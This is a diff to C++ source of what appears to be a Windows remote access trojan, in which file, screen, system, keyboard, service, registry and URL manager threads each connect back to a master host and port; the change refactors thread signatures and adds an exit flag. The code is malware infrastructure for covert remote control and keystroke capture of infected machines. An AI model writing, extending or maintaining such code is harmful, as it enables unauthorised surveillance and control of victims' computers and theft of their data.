@@ -14,10 +14,11 @@
 
 #include "InstallService.h"
 extern BOOL     bisUnInstall;
+extern BOOL g_bExit;
 
-DWORD WINAPI Loop_FileManager(SOCKET sRemote)
+DWORD WINAPI Loop_FileManager(LPVOID sRemote)
 {
-    CClientSocket	socketClient;
+    CClientSocket	socketClient(g_bExit);
     if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
         return -1;
 
@@ -37,9 +38,9 @@ DWORD WINAPI Loop_FileManager(SOCKET sRemote)
 // 	return 0;
 // }
 
-DWORD WINAPI Loop_ScreenManager(SOCKET sRemote)
+DWORD WINAPI Loop_ScreenManager(LPVOID sRemote)
 {
-    CClientSocket	socketClient;
+    CClientSocket	socketClient(g_bExit);
     if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
         return -1;
 
@@ -49,9 +50,9 @@ DWORD WINAPI Loop_ScreenManager(SOCKET sRemote)
     return 0;
 }
 
-DWORD WINAPI Loop_SystemManager(SOCKET sRemote)
+DWORD WINAPI Loop_SystemManager(LPVOID sRemote)
 {
-    CClientSocket	socketClient;
+    CClientSocket	socketClient(g_bExit);
     if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
         return -1;
 
@@ -62,9 +63,9 @@ DWORD WINAPI Loop_SystemManager(SOCKET sRemote)
 }
 
 
-DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)
+DWORD WINAPI Loop_KeyboardManager(LPVOID sRemote)
 {
-    CClientSocket	socketClient;
+    CClientSocket	socketClient(g_bExit);
     if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
         return -1;
     CKeyboardManager1	manager(&socketClient);
@@ -73,9 +74,9 @@ DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)
 }
 
 
-DWORD WINAPI Loop_ServiceManager(SOCKET sRemote)
+DWORD WINAPI Loop_ServiceManager(LPVOID sRemote)
 {
-    CClientSocket	socketClient;
+    CClientSocket	socketClient(g_bExit);
     if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
         return -1;
 
@@ -86,9 +87,9 @@ DWORD WINAPI Loop_ServiceManager(SOCKET sRemote)
     return 0;
 }
 
-DWORD WINAPI Loop_RegeditManager(SOCKET sRemote)          //注册表管理
+DWORD WINAPI Loop_RegeditManager(LPVOID sRemote)          //注册表管理
 {
-    CClientSocket	socketClient;
+    CClientSocket	socketClient(g_bExit);
     if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
         return -1;
 
@@ -97,9 +98,9 @@ DWORD WINAPI Loop_RegeditManager(SOCKET sRemote)          //注册表管理
     return 0;
 }
 
-DWORD WINAPI Loop_UrlManager(SOCKET sRemote)          //注册表管理
+DWORD WINAPI Loop_UrlManager(LPVOID sRemote)          //注册表管理
 {
-    CClientSocket	socketClient;
+    CClientSocket	socketClient(g_bExit);
     if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
         return -1;
 
